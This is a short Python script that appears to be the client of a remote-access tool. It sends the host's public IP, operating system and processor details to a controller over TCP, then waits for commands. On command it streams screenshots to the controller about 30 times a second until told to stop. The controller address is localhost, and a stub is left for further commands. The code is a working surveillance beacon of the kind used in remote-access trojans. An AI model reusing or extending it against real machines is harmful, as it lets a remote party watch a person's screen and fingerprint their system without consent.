import socket
import platform
import requests
import os
import time
from PIL import ImageGrab  # For taking screenshots
from PIL import ImageDraw, Image, ImageFont
from datetime import datetime
import threading

ip = "127.0.0.1"
port = 50000
address = (ip, port)

# Get the public IP address and strip any trailing whitespace (including newlines)
get_ip = requests.get('https://ipv4.icanhazip.com').text.strip()
get_os = platform.system()
get_release = platform.release()
arch = platform.processor()

get_total_os = f"{get_ip}&{get_os}&{get_release}&{arch}"
print(get_total_os)

stop_screenshot_flag = threading.Event()  # Use an Event for thread communication

def take_screenshot(i, file_path="ss.png"):
    screenshot = ImageGrab.grab()
    font = ImageFont.truetype("./Roboto-Medium.ttf", 40)  # You can adjust the size (40) as needed
    draw = ImageDraw.Draw(screenshot)
    draw.text((0,0), str(i), (255,0,0), font=font)
    screenshot.save(file_path, "PNG")

def send_screenshots(server_socket):
    i = 0
    while not stop_screenshot_flag.is_set():
        i += 1
        take_screenshot(i, "ss.png")
        
        with open("ss.png", "rb") as file:
            screenshot_data = file.read()
            server_socket.send(screenshot_data)
        
        time.sleep(1 / 30)  # 30 FPS screenshot capture

def main():
    global stop_screenshot_flag
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect(address)
        try:
            server_socket.send(get_total_os.encode('utf-8'))
        except socket.error as e:
            print(f"Error: {e}")
    except socket.error as e:
        print(f"Socket error: {e}")
        exit(1)

    screenshot_thread = None  # This will hold the screenshot thread

    while True:
        data = server_socket.recv(100000).decode("utf-8").strip()
        print("Command: " + data)

        if data == "ScreenSHT-CMD":
            if screenshot_thread is None or not screenshot_thread.is_alive():
                stop_screenshot_flag.clear()  # Clear the event to start taking screenshots
                screenshot_thread = threading.Thread(target=send_screenshots, args=(server_socket,))
                screenshot_thread.start()

        elif data == "STOP-SCREENSHOT":
            if screenshot_thread is not None and screenshot_thread.is_alive():
                stop_screenshot_flag.set()  # Set the event to stop the screenshot process
                screenshot_thread.join()  # Wait for the thread to finish

        else:
            # Handle other commands here
            print(f"Received different command: {data}")
            

if __name__ == "__main__":
    main()
